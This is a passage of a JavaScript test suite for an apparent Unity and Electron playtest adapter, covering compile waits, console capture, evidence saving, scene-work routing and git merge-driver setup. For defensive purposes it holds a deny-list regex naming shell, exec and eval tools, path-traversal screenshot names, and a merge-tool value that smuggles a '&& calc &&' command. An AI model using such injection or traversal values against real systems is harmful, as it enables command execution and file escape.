    assert.deepEqual(err.errors, errors, 'recompile_status has none after an editor launch: the console\'s compiler errors stand in');
    return true;
  });
  assert.ok(world.logs.some((l) => /script recompile refused \(.*Scripts still have compile errors/.test(l)), world.logs.join('\n'));
  assert.equal(world.editor.log.includes('editor.playmode start'), false);
  assert.equal(count(world.editor.log, 'editor set_auto_tick'), 2);
});

test('unity pipeline recompile: still compiling at the end of the bounded wait is an environment failure (still-compiling)', async () => {
  const world = pipelineWorld({ compile: 'forever' });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), (err) => {
    assert.deepEqual([err.environment, err.reason], [true, 'still-compiling']);
    assert.match(err.message, new RegExp(`^Unity was still compiling after ${ED.COMPILE_WAIT_MS / 1000}s - not a playtest result \\(Unity did not finish compiling`));
    return true;
  });
  assert.ok(world.t >= ED.COMPILE_WAIT_MS, 'bounded by the named constant');
  assert.ok(world.t < ED.COMPILE_WAIT_MS + 5000);
  assert.equal(world.editor.log.includes('editor.playmode start'), false);
  assert.deepEqual(world.editor.autoTick, [AUTO_TICK_ON, AUTO_TICK_ON], 'restored after the timeout');
  assert.equal(adapter.environmentFailure().reason, 'still-compiling');
});

test('unity pipeline recompile: an editor that never comes back from its reload is an environment failure (editor-busy)', async () => {
  const world = pipelineWorld({ compile: 'reloadForever' });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), (err) => {
    assert.deepEqual([err.environment, err.reason], [true, 'editor-busy']);
    assert.match(err.message, /^the Unity editor stayed busy after 240s - not a playtest result \(.*last error: Unity editor not open on/);
    return true;
  });
  assert.ok(world.t >= ED.COMPILE_WAIT_MS);
  // The editor is gone: the restore is tried, fails and says so.
  assert.ok(world.logs.some((l) => /could not restore the Unity auto tick setting/.test(l)), world.logs.join('\n'));
});

test('unity pipeline recompile: busy answers before and during the compile are retried, not failures', async () => {
  const world = pipelineWorld({ compile: { polls: 1 } });
  world.editor.busy = 3; // the editor is settling when LunaCore arrives
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  assert.deepEqual(world.editor.log.slice(0, 4), ['editor set_auto_tick (busy)', 'editor set_auto_tick (busy)', 'editor set_auto_tick (busy)', 'editor set_auto_tick']);
  assert.equal(count(world.editor.log, 'editor set_auto_tick'), 1, 'a busy answer did not run: sent again, run once');
  assert.ok(adapter.tools().allowedTools.length > 0);
  await adapter.stop();
});

test('unity pipeline recompile: "completed" before the scripts reloaded is not done - play waits for the new code', async () => {
  const world = pipelineWorld({ compile: { polls: 0 }, reloadDelayPolls: 3 });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  assert.equal(world.editor.codeLoadAtPlay, 2, 'play mode started only after codeLoadCount moved');
  assert.ok(world.logs.some((l) => /compiled, waiting for the script reload/.test(l)), world.logs.join('\n'));
  assert.equal(count(world.logs, world.logs.find((l) => /waiting for the script reload/.test(l))), 1, 'said once');
  await adapter.stop();
});

test('unity pipeline recompile: a lost recompile answer - waited out when it ran, sent again when its status still reads idle', async () => {
  const ran = pipelineWorld({ compile: { polls: 1 }, recompileLost: 'ran' });
  const a1 = A.createAdapter('unity', ran.opts);
  await a1.start(pipelineProfile);
  assert.equal(count(ran.editor.log, 'script recompile'), 1, 'never sent twice when it may have run');
  assert.equal(ran.editor.codeLoadAtPlay, 2);
  assert.ok(ran.logs.some((l) => /script recompile: no answer/.test(l)), ran.logs.join('\n'));
  await a1.stop();

  const lost = pipelineWorld({ compile: { polls: 1 }, recompileLost: 'notRun' });
  const a2 = A.createAdapter('unity', lost.opts);
  await a2.start(pipelineProfile);
  assert.deepEqual(lost.editor.log.filter((l) => l.startsWith('script recompile ') || l === 'script recompile'), ['script recompile (lost before it ran)', 'script recompile']);
  assert.ok(lost.logs.some((l) => /status reads idle: sending it again/.test(l)), lost.logs.join('\n'));
  assert.equal(lost.editor.codeLoadAtPlay, 2, 'the new code is played, not the old');
  await a2.stop();
});

test('unity pipeline recompile: without groundTruth the status decides after a grace - unless the recompile went unanswered', async () => {
  const plain = pipelineWorld({ noGroundTruth: true });
  const a1 = A.createAdapter('unity', plain.opts);
  await a1.start(pipelineProfile);
  assert.ok(plain.logs.some((l) => /gave no groundTruth; the compile verdict is recompile_status alone/.test(l)), plain.logs.join('\n'));
  await a1.stop();

  const unsure = pipelineWorld({ noGroundTruth: true, compile: { polls: 0 }, recompileLost: 'ran' });
  await assert.rejects(A.createAdapter('unity', unsure.opts).start(pipelineProfile), (err) => {
    assert.deepEqual([err.environment, err.reason], [true, 'editor-busy']);
    assert.match(err.message, /Unity gave no current compile state/);
    assert.match(err.message, /the recompile was sent without an answer/);
    return true;
  });
  assert.equal(unsure.editor.log.includes('editor.playmode start'), false, 'no playtest on an unconfirmed compile');
});

test('unity pipeline recompile: a hung compile whose editor then vanishes still reports still-compiling, with the last status', async () => {
  const world = pipelineWorld({ compile: 'forever', vanishAfterPolls: 3 });
  await assert.rejects(A.createAdapter('unity', world.opts).start(pipelineProfile), (err) => {
    assert.equal(err.reason, 'still-compiling', 'the last answer said compiling; the reload after it does not change that');
    assert.match(err.message, /last error: Unity editor not open on/);
    assert.match(err.message, /last recompile status: 'compiling'/);
    assert.ok(err.cause instanceof Error, 'the wait that ran out is the cause');
    return true;
  });
});

test('unity pipeline auto tick: set_auto_tick is idempotent - a lost answer is sent again, on start and on restore', async () => {
  const world = pipelineWorld({ lostAutoTick: 1 });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  assert.deepEqual(world.editor.autoTick, [AUTO_TICK_ON, AUTO_TICK_ON], 'lost once, sent again');
  world.editor.lostAutoTick = 1; // the restore's answer is lost in the reload of leaving play mode
  assert.equal(await adapter.stop(), true);
  assert.equal(world.editor.autoTick.length, 4);
  assert.equal(world.logs.some((l) => /could not restore/.test(l)), false, world.logs.join('\n'));
});

test('unity pipeline auto tick: the previous setting comes from the project\'s Pipeline config and is restored on success and failure', async () => {
  const world = pipelineWorld();
  writePipelineConfig(world.opts.projectDir, { m_HttpEnabled: true, m_WatchdogEnabled: false });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  assert.deepEqual(world.editor.autoTick, [AUTO_TICK_ON]);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.autoTick.at(-1), { enabled: false, 'interval-ms': 16, persist: true }, 'watchdog off: auto tick was off');
  assert.equal(await adapter.stop(), true);
  assert.equal(world.editor.autoTick.length, 2, 'restored once');

  const failing = pipelineWorld({ playFails: true });
  writePipelineConfig(failing.opts.projectDir, { m_WatchdogEnabled: false });
  await assert.rejects(A.createAdapter('unity', failing.opts).start(pipelineProfile), /Play mode is disabled/);
  assert.deepEqual(failing.editor.autoTick.map((p) => p.enabled), [true, false], 'restored when start fails after play');

  const broken = pipelineWorld();
  writePipelineConfig(broken.opts.projectDir, '{"m_WatchdogEnabled": nope');
  const third = A.createAdapter('unity', broken.opts);
  await third.start(pipelineProfile);
  await third.stop();
  assert.deepEqual(broken.editor.autoTick.at(-1), AUTO_TICK_ON, 'unreadable config: the package default');
  assert.ok(broken.logs.some((l) => /Pipeline config unreadable \(not valid JSON\)/.test(l)), broken.logs.join('\n'));
});

test('unity pipeline auto tick: an editor that refuses set_auto_tick still compiles; nothing to restore', async () => {
  const world = pipelineWorld();
  const answers = world.editor;
  const connect = world.opts.connectPipeline;
  world.opts.connectPipeline = (dir) => {
    const client = connect(dir);
    return {
      exec: (command, parameters) => (command === 'editor set_auto_tick'
        ? Promise.reject(Object.assign(new Error("Unity command 'editor set_auto_tick' failed: EditorApplication.SignalTick not found"), { code: P.PIPELINE_ERROR.failed }))
        : client.exec(command, parameters)),
      close: client.close,
    };
  };
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  assert.ok(world.logs.some((l) => /auto tick refused \(.*SignalTick not found\); going on/.test(l)), world.logs.join('\n'));
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(answers.autoTick, [], 'never changed, never restored');
});

test('unity pipeline console window: entries logged before the playtest start are not in the evidence nor in the Playtester\'s console_errors', async () => {
  const before = [
    ['error', 'prefab create failed: Assets/Art/Crate.prefab'],
    ['error', 'Could not create asset Assets/Art/e2e-tex.png'],
    ['warn', 'Texture import warning: e2e-tex.png'],
  ];
  const world = pipelineWorld({ consoleBefore: before });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);

  // The cursor is taken before play mode: everything up to seq 3 is outside the window.
  const args = adapter.tools().mcpConfig.mcpServers[SERVER_NAMES.unity].args;
  assert.deepEqual(args.slice(-4), ['--unity-console-session', CONSOLE_SESSION, '--unity-console-cursor', '3']);

  // The Playtester's console_errors through the bridge with exactly those flags: only the game's own error.
  const bridge = createBridge({
    backend: 'unity',
    evidenceDir: tmpDir('lw-unity-window-'),
    invoke: bridgeUnityBackend({
      transport: 'pipeline',
      consoleWindow: { session: args.at(-3), cursor: Number(args.at(-1)) },
      connect: () => world.editor.connect(path.resolve(world.opts.projectDir)),
    }),
  });
  const seen = JSON.parse((await bridge.callTool('console_errors', {})).content[0].text);
  assert.deepEqual(seen.entries.map((e) => e.message), ['NullReferenceException in Enemy.Update']);
  assert.deepEqual(seen.counts, { error: 1, warn: 0, log: 0 });

  await adapter.stop();
  const dump = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.CONSOLE_FILE), 'utf8'));
  assert.deepEqual(dump.entries.map((e) => e.message), ['NullReferenceException in Enemy.Update']);
  assert.deepEqual(dump.counts, { error: 1, warn: 0, log: 0 }, 'not the buffer-wide {error 3, warn 1}');
  assert.deepEqual(dump.window, { scope: 'since-start', startedAt: new Date(0).toISOString(), session: CONSOLE_SESSION, cursor: 3 }, 'the file says which window it covers');
  assert.equal(dump.groundTruth.compilationFailed, false, 'the compile state stays');
  assert.equal(dump.groundTruth.consoleErrors, 3, "the editor's own total is kept as the editor's, not counted as the playtest's");
});

test('unity pipeline console window: a new capture session (editor restart) is a fresh window', async () => {
  const world = pipelineWorld({ consoleBefore: [['error', 'old error']] });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  // The editor restarted its console capture: new session, sequence numbers begin again.
  world.editor.consoleSession = 'ab'.repeat(16);
  world.editor.console = [];
  world.editor.logConsole('warn', 'after the restart');
  await adapter.stop();
  const dump = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.CONSOLE_FILE), 'utf8'));
  assert.deepEqual(dump.entries.map((e) => e.message), ['after the restart']);
  assert.deepEqual(dump.window, { scope: 'fresh-session', startedAt: new Date(0).toISOString(), session: CONSOLE_SESSION, cursor: 1, newSession: 'ab'.repeat(16) });
  assert.deepEqual(dump.counts, { error: 0, warn: 1, log: 0 });
});

test('unity pipeline partial driver: state + input listed, no playtest screenshot - capture game_view stands in, nothing missing is called', async () => {
  const world = pipelineWorld({ listed: ['playtest state', 'playtest input'] });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);

  assert.deepEqual(world.editor.log.slice(-2), ['pipeline list_commands', 'playtest state'], 'the listed state is still checked');
  assert.ok(world.logs.some((l) => /PlaytestDriver lacks playtest screenshot; the editor's built-in equivalent stands in/.test(l)), world.logs.join('\n'));
  const args = adapter.tools().mcpConfig.mcpServers[SERVER_NAMES.unity].args;
  assert.ok(!args.includes('--unity-driver'), 'still the driver path');
  assert.deepEqual(args.slice(args.indexOf('--unity-fallback'), args.indexOf('--unity-fallback') + 2), ['--unity-fallback', 'screenshot']);

  world.editor.log.length = 0;
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.log, ['console get', 'playtest state', 'capture game_view', 'editor.playmode stop', 'editor set_auto_tick']);
  assert.deepEqual(world.editor.notFound, [], 'playtest screenshot is never tried');
  assert.ok(isPng(path.join(adapter.evidenceDir, U.FINAL_SHOT)), 'the Game view capture is the final screenshot');
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.STATE_FILE), 'utf8')), { scene: 'Level1', score: 3 }, "the driver's own state");
});

test('unity pipeline partial driver without playtest state: no state probe, built-in state, no combat log', async () => {
  const world = pipelineWorld({ listed: ['playtest input', 'playtest screenshot'] });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  assert.equal(world.editor.log.at(-1), 'pipeline list_commands', 'nothing unlisted is probed');
  const args = adapter.tools().mcpConfig.mcpServers[SERVER_NAMES.unity].args;
  assert.equal(args[args.indexOf('--unity-fallback') + 1], 'state');
  assert.equal(await adapter.combatFeelLog(), null);
  world.editor.log.length = 0;
  await adapter.stop();
  assert.deepEqual(world.editor.log.slice(1, 6), ['runtime status', 'scene list_open', 'gameobject find', 'gameobject find', 'component get_properties']);
  assert.ok(world.editor.log.includes('playtest screenshot'));
  assert.deepEqual(world.editor.notFound, []);
});

test('environmentFailureOf: a plain result for an environment failure, null for anything else', () => {
  assert.equal(U.environmentFailureOf(new Error('boom')), null);
  assert.equal(U.environmentFailureOf(null), null);
  assert.equal(U.isEnvironmentFailure({ code: U.UNITY_ENVIRONMENT_FAILURE }), false, 'the code alone is not enough');
  assert.deepEqual(Object.values(U.ENVIRONMENT_REASON).sort(), ['compile-failed', 'editor-busy', 'still-compiling']);
});

// ============================================================================
// both adapters: no file or code access
// ============================================================================

const FILE_OR_CODE = /file|path|dir|folder|read_?file|write|eval|exec|script|code|shell|bash|command|navigate|upload|source|require|import/i;
const BUILT_IN_TOOLS = ['Read', 'Write', 'Edit', 'MultiEdit', 'Bash', 'Grep', 'Glob', 'NotebookEdit', 'WebFetch', 'WebSearch', 'Task', 'Agent'];

async function startedTools(name) {
  if (name === 'electron') {
    const world = electronWorld();
    const adapter = A.createAdapter('electron', world.opts);
    await adapter.start(electronProfile);
    return { adapter, tools: adapter.tools() };
  }
  const world = unityWorld();
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(unityProfile);
  return { adapter, tools: adapter.tools() };
}

for (const backend of ['electron', 'unity']) {
  test(`${backend} tool list has no file or code access tools`, async () => {
    const { adapter, tools } = await startedTools(backend);
    const prefix = `mcp__${SERVER_NAMES[backend]}__`;
    assert.ok(tools.allowedTools.length > 0);
    for (const t of tools.allowedTools) {
      assert.ok(t.startsWith(prefix), t);
      assert.doesNotMatch(t.slice(prefix.length), FILE_OR_CODE, t);
    }
    for (const builtIn of BUILT_IN_TOOLS) assert.ok(!tools.allowedTools.includes(builtIn), builtIn);

    // What the Playtester sees from the bridge is exactly the allow-list, and
    // no tool takes a path, a script or code as an argument.
    const bridge = createBridge({ backend, evidenceDir: adapter.evidenceDir, invoke: async () => ({}) });
    const listed = (await bridge.handle({ jsonrpc: '2.0', id: 1, method: 'tools/list' })).result.tools;
    assert.deepEqual(listed.map((d) => `${prefix}${d.name}`), tools.allowedTools);
    const argNames = JSON.stringify(listed.map((d) => d.inputSchema)).match(/"([A-Za-z_]+)":\{"type"/g) || [];
    for (const arg of argNames) assert.doesNotMatch(arg, FILE_OR_CODE, arg);

    // A tool outside the list is refused by the bridge itself.
    for (const name of ['evaluate', 'browser_evaluate', 'read_file', 'execute_menu_item', 'manage_script']) {
      const res = await bridge.callTool(name, { script: 'require("fs")' });
      assert.equal(res.isError, true, name);
    }
    await adapter.stop();
  });
}

test('a screenshot name cannot leave the evidence dir', async () => {
  const evidenceDir = tmpDir('lw-shot-');
  const bridge = createBridge({ backend: 'electron', evidenceDir, invoke: async () => ({ png: PNG }) });
  for (const name of ['../escape', '..\\escape', 'sub/dir', 'C:evil', '.hidden', '']) {
    const res = await bridge.callTool('screenshot', { name });
    assert.equal(res.isError, true, name);
  }
  const ok = await bridge.callTool('screenshot', { name: 'home-wide' });
  assert.equal(ok.isError, undefined);
  assert.deepEqual(fs.readdirSync(evidenceDir), ['home-wide.png']);
});

// ============================================================================
// evidence per iteration
// ============================================================================

test('electron evidence is saved per iteration', async () => {
  const runsRoot = path.join(tmpDir('lw-runs-'), 'runs');
  const dirs = [];
  for (const iteration of [1, 2]) {
    const world = electronWorld({ iteration, runsRoot, exitOnQuit: false });
    const adapter = A.createAdapter('electron', world.opts);
    await adapter.start(electronProfile);
    assert.equal(adapter.tools().mcpConfig.mcpServers[SERVER_NAMES.electron].args[4], adapter.evidenceDir, 'the bridge saves into this iteration');
    await adapter.stop();
    dirs.push(adapter.evidenceDir);
  }
  assert.deepEqual(dirs, [1, 2].map((n) => A.evidenceDirFor(runsRoot, 'abc123', n)));
  for (const dir of dirs) {
    assert.ok(isPng(path.join(dir, 'final-1.png')), dir);
    assert.ok(fs.existsSync(path.join(dir, E.APP_LOG)), dir);
  }
});

test('unity evidence is saved per iteration', async () => {
  const runsRoot = path.join(tmpDir('lw-runs-'), 'runs');
  const dirs = [];
  for (const iteration of [1, 2]) {
    const world = unityWorld(undefined, { iteration, runsRoot });
    const adapter = A.createAdapter('unity', world.opts);
    await adapter.start(unityProfile);
    await adapter.stop();
    dirs.push(adapter.evidenceDir);
  }
  assert.deepEqual(dirs, [1, 2].map((n) => A.evidenceDirFor(runsRoot, 'abc123', n)));
  for (const dir of dirs) {
    for (const file of [U.CONSOLE_FILE, U.STATE_FILE, U.FINAL_SHOT]) assert.ok(fs.existsSync(path.join(dir, file)), `${dir} ${file}`);
  }
});

// ============================================================================
// scene / prefab work -> the one scene worker
// ============================================================================

const SCENE_CARDS = [
  { at: 1, text: 'Score counter logic', files: ['Assets/Scripts/Score.cs'] },
  { at: 2, text: 'Place the HUD in the level', files: ['Assets/Scenes/Level1.unity'] },
  { at: 3, text: 'Give Enemy.prefab a hit flash' },
  { at: 4, text: 'Unity Test Framework tests for the score' },
];

function scenePlan() {
  return [
    { id: 'score', title: 'Score', todoAts: [1], files: ['Assets/Scripts/Score.cs'], dependsOn: [], prompt: 'score', model: 'sonnet', effort: 'medium' },
    { id: 'hud', title: 'HUD', todoAts: [2], files: ['Assets/Scenes/Level1.unity'], dependsOn: ['score'], prompt: 'hud', model: 'sonnet', effort: 'medium', verify: 'unity tests' },
    { id: 'enemy', title: 'Enemy', todoAts: [3], files: ['Assets/Scripts/Enemy.cs'], dependsOn: [], prompt: 'enemy', model: 'opus', effort: 'high' },
    { id: 'tests', title: 'Tests', todoAts: [4], files: ['Assets/Tests/ScoreTests.cs'], dependsOn: ['hud', 'enemy'], prompt: 'tests', model: 'sonnet', effort: 'medium' },
  ];
}

test('scene and prefab cards are always routed to the single scene worker', () => {
  const plan = scenePlan();
  const out = Scene.routeScenePackages(plan, SCENE_CARDS);

  assert.deepEqual(out.map((p) => p.id), ['score', Scene.SCENE_WORKER_ID, 'tests']);
  const worker = out[1];
  assert.deepEqual(worker.todoAts, [2, 3]);
  assert.deepEqual(worker.files, ['Assets/Scenes/Level1.unity', 'Assets/Scripts/Enemy.cs']);
  assert.deepEqual(worker.dependsOn, ['score']);
  assert.equal(worker.model, 'opus', 'the strongest model of its members');
  assert.equal(worker.effort, 'high');
  assert.equal(worker.verify, 'unity tests');
  assert.match(worker.prompt, /## HUD[\s\S]*hud[\s\S]*## Enemy[\s\S]*enemy/);
  assert.deepEqual(out[2].dependsOn, [Scene.SCENE_WORKER_ID], 'deps on merged packages point at the worker');
  assert.ok(out[0].prompt.endsWith(Scene.CODE_WORKER_NOTE), 'code workers are told to leave scenes alone');
  assert.equal(out.filter((p) => p.files.some(Scene.isSceneFile)).length, 1, 'exactly one package touches scenes');
  assert.deepEqual(plan, scenePlan(), 'the planner output is not mutated');
});

test('a package between two scene packages is folded in, so no dependency cycle appears', () => {
  const plan = [
    { id: 'a', todoAts: [], files: ['Assets/A.unity'], dependsOn: [] },
    { id: 'mid', todoAts: [], files: ['Assets/Scripts/Mid.cs'], dependsOn: ['a'] },
    { id: 'b', todoAts: [], files: ['Assets/B.prefab'], dependsOn: ['mid'] },
    { id: 'free', todoAts: [], files: ['Assets/Scripts/Free.cs'], dependsOn: [] },
  ];
  const out = Scene.routeScenePackages(plan, []);
  assert.deepEqual(out.map((p) => p.id), [Scene.SCENE_WORKER_ID, 'free']);
  assert.deepEqual(out[0].dependsOn, []);
});

test('a plan without scene work is returned as it was', () => {
  const plan = [{ id: 'a', todoAts: [1], files: ['src/app.js'], dependsOn: [] }];
  assert.equal(Scene.routeScenePackages(plan, [{ at: 1, text: 'Unity build settings', files: ['src/app.js'] }]), plan);
  assert.equal(Scene.isSceneCard({ text: 'Fix the Main.unity lighting' }), true);
  assert.equal(Scene.isSceneCard({ text: 'x', details: 'touches Player.prefab only' }), true);
  assert.equal(Scene.isSceneCard({ text: 'Port the game to Unity 6' }), false);
  assert.equal(Scene.isSceneCard({ text: 'Upgrade com.unity.inputsystem' }), false);
});

test('the ownership map gives every scene and prefab to the scene worker', () => {
  const map = Scene.sceneOwnership({ 'Assets/Scripts/Score.cs': 'score', 'Assets/Scenes/Level1.unity': 'hud' });
  assert.deepEqual(map, {
    'Assets/Scripts/Score.cs': 'score',
    'Assets/Scenes/Level1.unity': Scene.SCENE_WORKER_ID,
    '**/*.unity': Scene.SCENE_WORKER_ID,
    '**/*.prefab': Scene.SCENE_WORKER_ID,
  });
  assert.deepEqual(Scene.sceneOwnership([{ path: 'Assets/P.prefab', cardId: 7 }, { path: 'a.cs', cardId: 8 }])['Assets/P.prefab'], Scene.SCENE_WORKER_ID);
});

function unityBuilder({ unity }) {
  const calls = { makePlan: [], merge: [] };
  let settle = null;
  const orchestra = {
    makePlan: async (ctx) => {
      calls.makePlan.push(ctx);
      settle = ctx.onRunSettled;
      return { ok: true, plan: { id: 'p1', errors: [] } };
    },
    launch: async () => ({ ok: true }),
    cancelPlanWait: () => ({ ok: true }),
  };
  const builder = createGodModeBuilder({
    orchestra,
    profileId: () => 'default',
    env: () => ({}),
    isUnityProject: () => unity,
    configureUnityMerge: async (repo) => {
      calls.merge.push(repo);
      return { ok: true, attributes: true, driver: true };
    },
  });
  return { builder, calls, settle: (r) => settle(r) };
}

test('a Unity build: merge driver set up, scene ownership passed, scene packages routed by the planner wrapper', async () => {
  const { builder, calls, settle } = unityBuilder({ unity: true });
  const planner = builder.wrapPlanner(async () => ({ ok: true, raw: { packages: scenePlan() } }));
  const building = builder.build({ projectId: 'game', repoPath: '/game', cards: SCENE_CARDS, checkCommand: '' });
  for (let i = 0; i < 5 && !calls.makePlan.length; i += 1) await new Promise((r) => setImmediate(r));

  assert.deepEqual(calls.merge, ['/game']);
  assert.deepEqual(calls.makePlan[0].ownership, Scene.sceneOwnership());
  const res = await planner({});
  assert.deepEqual(res.raw.packages.map((p) => p.id), ['score', Scene.SCENE_WORKER_ID, 'tests']);
  settle({ planId: 'p1', integration: { state: 'done' } });
  await building;
});

test('a non-Unity build is planned exactly as before', async () => {
  const { builder, calls, settle } = unityBuilder({ unity: false });
  const building = builder.build({ projectId: 'web', repoPath: '/web', cards: SCENE_CARDS.slice(0, 1), checkCommand: '' });
  for (let i = 0; i < 5 && !calls.makePlan.length; i += 1) await new Promise((r) => setImmediate(r));

  assert.deepEqual(calls.merge, []);
  assert.equal('ownership' in calls.makePlan[0], false);
  settle({ planId: 'p1', integration: { state: 'done' } });
  await building;
});

// ============================================================================
// UnityYAMLMerge merge driver
// ============================================================================

const MERGE_TOOL = 'C:\\Program Files\\Unity\\Hub\\Editor\\6000.0.23f1\\Editor\\Data\\Tools\\UnityYAMLMerge.exe';

/** A temp repo dir and a fake git: rev-parse answers `.git`, config calls are recorded. */
function mergeRepo({ git = true } = {}) {
  const repo = tmpDir('lw-unity-repo-');
  const calls = [];
  const execImpl = (file, args, options, cb) => {
    calls.push(args);
    if (!git) return cb(new Error('not a git repository'), '', 'fatal: not a git repository');
    if (args.includes('rev-parse')) return cb(null, '.git\n', '');
    return cb(null, '', '');
  };
  return { repo, calls, execImpl };
}

test('the merge driver config is written: .gitattributes, info/attributes and git config', async () => {
  const { repo, calls, execImpl } = mergeRepo();
  fs.writeFileSync(path.join(repo, '.gitattributes'), '* text=auto\r\n*.png binary\r\n');

  const res = await Scene.configureUnityMerge(repo, { mergeTool: MERGE_TOOL, execImpl });
  assert.deepEqual(res, { ok: true, attributes: true, driver: true, tool: MERGE_TOOL });

  const attributes = fs.readFileSync(path.join(repo, '.gitattributes'), 'utf8');
  assert.ok(attributes.startsWith('* text=auto\n*.png binary\n'), 'existing rules kept');
  for (const ext of ['unity', 'prefab', 'asset']) assert.match(attributes, new RegExp(`^\\*\\.${ext} merge=unityyamlmerge eol=lf$`, 'm'));
  // The common dir's info/attributes covers every worktree of the repo.
  assert.equal(fs.readFileSync(path.join(repo, '.git', 'info', 'attributes'), 'utf8'), Scene.withAttributesBlock(''));

  const configs = calls.filter((a) => a.includes('config')).map((a) => a.slice(a.indexOf('config') + 1));
  assert.deepEqual(configs, [
    ['merge.unityyamlmerge.name', 'Unity SmartMerge (UnityYAMLMerge)'],
    ['merge.unityyamlmerge.driver', '"C:/Program Files/Unity/Hub/Editor/6000.0.23f1/Editor/Data/Tools/UnityYAMLMerge.exe" merge -h -p --force %O %B %A %A'],
    ['merge.unityyamlmerge.recursive', 'binary'],
  ]);
  assert.ok(calls.every((a) => a[0] === '-C' && a[1] === repo), 'git runs in the repo');

  // Idempotent: a second run changes nothing.
  await Scene.configureUnityMerge(repo, { mergeTool: MERGE_TOOL, execImpl });
  assert.equal(fs.readFileSync(path.join(repo, '.gitattributes'), 'utf8'), attributes);
});

test("UnityYAMLMerge is found in Unity Hub for the project's editor version", async () => {
  const { repo, calls, execImpl } = mergeRepo();
  fs.mkdirSync(path.join(repo, 'ProjectSettings'));
  fs.writeFileSync(path.join(repo, 'ProjectSettings', 'ProjectVersion.txt'), 'm_EditorVersion: 6000.0.23f1\nm_EditorVersionWithRevision: 6000.0.23f1 (abc)\n');
  assert.equal(Scene.isUnityProject(repo), true);
  assert.equal(Scene.isUnityProject(tmpDir('lw-not-unity-')), false);

  const hubTool = 'D:\\Unity\\Hub\\Editor\\6000.0.23f1\\Editor\\Data\\Tools\\UnityYAMLMerge.exe';
  const fsImpl = { ...fs, existsSync: (p) => p === hubTool || fs.existsSync(p) };
  assert.equal(Scene.findUnityYamlMerge(repo, { fsImpl, platform: 'win32', env: { ProgramFiles: 'D:\\' } }), hubTool);

  const res = await Scene.configureUnityMerge(repo, { execImpl, fsImpl, platform: 'win32', env: { ProgramFiles: 'D:\\' } });
  assert.equal(res.driver, true);
  assert.equal(res.tool, hubTool);
  assert.ok(calls.some((a) => a.includes('merge.unityyamlmerge.driver')));
});

test('without UnityYAMLMerge the attributes are still written; unsafe or missing git is refused', async () => {
  const none = mergeRepo();
  const res = await Scene.configureUnityMerge(none.repo, { execImpl: none.execImpl, platform: 'win32', env: {} });
  assert.equal(res.ok, true);
  assert.equal(res.driver, false);
  assert.match(res.warning, /UnityYAMLMerge not found/);
  assert.ok(fs.existsSync(path.join(none.repo, '.gitattributes')));
  assert.equal(none.calls.filter((a) => a.includes('config')).length, 0);

  const unsafe = mergeRepo();
  const bad = await Scene.configureUnityMerge(unsafe.repo, { mergeTool: 'C:\\x" && calc && "', execImpl: unsafe.execImpl });
  assert.deepEqual([bad.ok, bad.error], [false, 'badMergeTool']);
  assert.equal(unsafe.calls.filter((a) => a.includes('config')).length, 0);

  const noGit = mergeRepo({ git: false });
  const res2 = await Scene.configureUnityMerge(noGit.repo, { mergeTool: MERGE_TOOL, execImpl: noGit.execImpl });
  assert.deepEqual([res2.ok, res2.error], [false, 'notGitRepo']);
  assert.equal(fs.existsSync(path.join(noGit.repo, '.gitattributes')), false);
});

// ============================================================================
// PlaytestDriver God Mode card
// ============================================================================

test('the PlaytestDriver card builds Unity Pipeline commands: dev-only guard, scripted input, JSON state, screenshot, PlayMode tests', () => {
  const card = U.PLAYTEST_DRIVER_CARD;
  assert.ok(Object.isFrozen(card));
  assert.match(card.text, /^PlaytestDriver as Unity Pipeline commands/);
  assert.equal(U.PLAYTEST_DRIVER_GUARD, '#if UNITY_EDITOR || DEVELOPMENT_BUILD');
  assert.ok(card.details.includes(U.PLAYTEST_DRIVER_GUARD) && card.details.includes('#endif'));
  assert.match(card.details, /com\.unity\.pipeline/);
  assert.match(card.details, /\[CliGroupCommand\(Group/);
  assert.match(card.details, /Group = "playtest"/);
  // Exactly the commands helpers/playtest-bridge/unity.js calls.
  for (const [command] of [UN.UNITY_PIPELINE.driver('state'), UN.UNITY_PIPELINE.driver('input', { steps: [] }), UN.UNITY_PIPELINE.driver('screenshot')]) {
    assert.ok(card.details.includes(`\`${command}`), command);
  }
  assert.match(card.details, /playtest input --steps <json>/);
  assert.match(card.details, /scripted inputs/);
  assert.match(card.details, /JSON/);
  assert.match(card.details, /Unity Test Framework/);
  assert.doesNotMatch(card.details, /execute_custom_tool|playtest_driver|PlaytestDriverTool/, 'no MCP for Unity custom tool left');
  // How a missing command is detected, what runs without it, and the error of a broken one.
  assert.ok(card.details.includes('each one only when `pipeline list_commands --group playtest` lists it'));
  assert.match(card.details, /built-in commands only/);
  assert.ok(card.details.includes(`${U.NO_DRIVER_ERROR} (Unity command 'playtest state' failed: ...)`));
  assert.ok(card.details.includes(card.text));

  assert.ok(card.files.every((f) => f.startsWith('Assets/LunaPlaytest/')), 'every file under Assets/LunaPlaytest/');
  for (const f of ['Assets/LunaPlaytest/PlaytestDriver.cs', 'Assets/LunaPlaytest/PlaytestInput.cs', 'Assets/LunaPlaytest/Editor/PlaytestCommands.cs']) {
    assert.ok(card.files.includes(f), f);
  }
  assert.ok(card.files.some((f) => f.includes('/Tests/PlayMode/')));

  // Verify runs against the open editor: batch mode cannot open a project the editor holds.
  assert.match(card.verify, /^unity test .*PlayMode/);
  assert.match(card.verify, /`unity test --help`/);
  assert.doesNotMatch(card.verify, /-batchmode|-projectPath/);
